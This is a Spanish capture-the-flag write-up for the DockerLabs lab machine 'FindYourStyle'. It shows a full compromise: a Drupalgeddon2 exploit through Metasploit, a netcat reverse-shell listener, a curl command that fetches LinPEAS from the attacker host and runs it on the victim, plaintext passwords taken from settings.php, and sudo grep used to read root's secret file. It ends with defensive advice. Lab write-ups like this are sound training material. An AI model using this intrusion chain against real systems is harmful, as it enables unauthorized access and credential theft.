# FindYourStyle — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 16/10/2024  
**Técnicas:** Nmap · Drupal 8 · Metasploit (Drupalgeddon2) · Reverse Shell · LinPEAS · Contraseña en settings.php · ls+grep/sudo

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Identificación de Drupal 8 y explotación con Metasploit](#2-identificación-de-drupal-8-y-explotación-con-metasploit)
3. [Reverse Shell desde meterpreter](#3-reverse-shell-desde-meterpreter)
4. [Movimiento lateral con LinPEAS — contraseña en settings.php](#4-movimiento-lateral-con-linpeas--contraseña-en-settingsphp)
5. [Escalada de privilegios — ls y grep con sudo](#5-escalada-de-privilegios--ls-y-grep-con-sudo)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh findyourstyle.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
|_http-title: Welcome to Find your own Style
|_http-generator: Drupal 8 (https://www.drupal.org)
```

Solo puerto 80. Nmap ya identifica directamente **Drupal 8** en las cabeceras.

---

## 2. Identificación de Drupal 8 y explotación con Metasploit

Visitamos `http://172.17.0.2` — CMS Drupal. Desde el `CHANGELOG.txt` o las cabeceras HTTP confirmamos la versión: **Drupal 8**.

Abrimos Metasploit y buscamos exploits disponibles:

```bash
msfconsole
msf6 > search Drupal 8
```

```
#  Name                                                      Rank       Description
0  exploit/unix/webapp/drupal_drupalgeddon2                  excellent  Drupal Drupalgeddon 2 Forms API Property Injection
```

Cargamos el exploit y configuramos el objetivo:

```bash
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
```

```
[*] Started reverse TCP handler on 192.168.1.26:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
```

> 💡 **Drupalgeddon2 (CVE-2018-7600)** es una vulnerabilidad crítica en el sistema de formularios de Drupal que permite RCE sin autenticación. Afecta a Drupal 6, 7 y 8 en versiones anteriores a los parches de abril 2018.

---

## 3. Reverse Shell desde meterpreter

Desde la sesión meterpreter obtenida, lanzamos una shell interactiva y luego mejoramos a una reverse shell:

```bash
meterpreter > shell
Process 27 created.
Channel 0 created.
whoami
www-data
```

Preparamos nc en nuestro host y enviamos el payload Bash de revshells.com por el parámetro cmd para obtener una shell más cómoda:

```bash
sudo nc -lvnp 443
```

Una vez con shell estable, enumeramos el sistema:

```bash
www-data@befc2528fb17:/var/www/html$ cd /home && ls -la
drwxr-xr-x 2 ballenita ballenita 4096 Oct 16 2024 ballenita
```

Un usuario: **ballenita**.

---

## 4. Movimiento lateral con LinPEAS — contraseña en settings.php

No encontramos escalada directa por sudo o SUID. Usamos **LinPEAS** para enumeración automática.

Desde nuestra máquina:

```bash
whereis linpeas
# /usr/bin/linpeas
python3 -m http.server 8000
```

En la víctima:

```bash
www-data@befc2528fb17:/var/www/html$ curl http://192.168.1.26:8000/linpeas.sh -O
www-data@befc2528fb17:/var/www/html$ chmod +x linpeas.sh
www-data@befc2528fb17:/var/www/html$ ./linpeas.sh
```

LinPEAS encuentra contraseñas en ficheros de configuración PHP:

```
Searching passwords in config PHP files
/var/www/html/sites/default/settings.php: * 'password' => 'sqlpassword',
/var/www/html/sites/default/settings.php: * 'password' => 'ballenitafeliz', //Cuidadito cuidadin pillin
```

Contraseña de ballenita: **ballenitafeliz**

```bash
www-data@befc2528fb17:/var/www/html$ su ballenita
Password: ballenitafeliz
ballenita@befc2528fb17:~$
```

---

## 5. Escalada de privilegios — ls y grep con sudo

```bash
ballenita@befc2528fb17:~$ sudo -l
```

```
User ballenita may run the following commands on befc2528fb17:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

`ls` con sudo para ver el directorio de root:

```bash
ballenita@befc2528fb17:~$ sudo /bin/ls /root/
secretitomaximo.txt
```

`grep` con sudo para leer el fichero (GTFObins):

```bash
ballenita@befc2528fb17:~$ LFILE=/root/secretitomaximo.txt
ballenita@befc2528fb17:~$ sudo /bin/grep '' $LFILE
nobodycanfindthispasswordrootrocks
```

```bash
ballenita@befc2528fb17:~$ su root
Password: nobodycanfindthispasswordrootrocks
root@befc2528fb17:/home/ballenita# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Drupal 8 sin parchear (Drupalgeddon2)** | Puerto 80 | RCE sin autenticación |
| **Contraseña en settings.php de Drupal** | `/sites/default/settings.php` | Credencial SSH de ballenita |
| **ls y grep con sudo** | Sudoers de ballenita | Lectura de ficheros de root |

**Para defenderse:**
- Mantener Drupal actualizado — Drupalgeddon2 tiene parche disponible desde abril 2018.
- Las contraseñas en `settings.php` deben estar en variables de entorno, nunca en texto plano.
- `ls` y `grep` con sudo permiten leer cualquier fichero del sistema. Nunca añadirlos al sudoers.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
